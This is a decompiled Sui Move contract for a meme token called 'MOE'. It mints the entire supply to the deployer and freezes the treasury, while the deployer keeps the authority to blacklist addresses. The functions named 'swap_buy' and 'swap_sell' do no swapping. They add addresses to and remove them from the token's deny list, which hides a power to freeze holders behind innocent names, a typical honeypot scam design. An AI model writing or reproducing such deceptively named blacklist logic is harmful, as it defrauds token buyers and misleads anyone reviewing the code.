module 0x5999eabac4e4aa9f5eab46ae3c3268ee3c1723da50bc7b532f196ef0881586ce::moe {
    struct MOE has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: MOE, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<MOE>(arg0, 9, b"MOE", b"MOE", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmWH44odXYncPqnsg8Lgcfzp2Xeb4eQgfmauqSeG5XEytf"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<MOE>(&mut v3, 420690000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<MOE>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<MOE>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<MOE>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<MOE>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<MOE>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<MOE>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<MOE>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

